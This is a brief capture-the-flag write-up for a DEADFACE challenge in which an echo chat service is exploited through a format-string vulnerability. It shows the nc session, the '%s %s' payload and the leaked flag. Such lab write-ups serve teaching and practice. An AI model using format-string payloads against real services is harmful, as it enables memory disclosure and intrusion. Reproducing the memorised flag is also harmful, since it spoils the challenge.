DEADFACE loves their vintage tech, but their "Echo Chamber" chat bot has a critical flaw from the old days. It echoes messages without sanitizing input, potentially leaking sensitive data. As a Turbo Tactical operative, connect to the remote service at echochamber.deadface.io:13337 and exploit it to reveal a hidden flag.

---
when we connect to the remote server it simply echoes back whatever we send, and because the challenge hints at a possible format-string vulnerability, a sensible test is to send the string `%s` to see how the server processes it.
```bash
~  nc echochamber.deadface.io 13337
DEADFACE Echo Chamber
Enter your message: %s %s
Echo: deadface{r3tr0_f0rm4t_l34k_3xp0s3d} deadface{r3tr0_f0rm4t_l34k_3xp0s3d}
```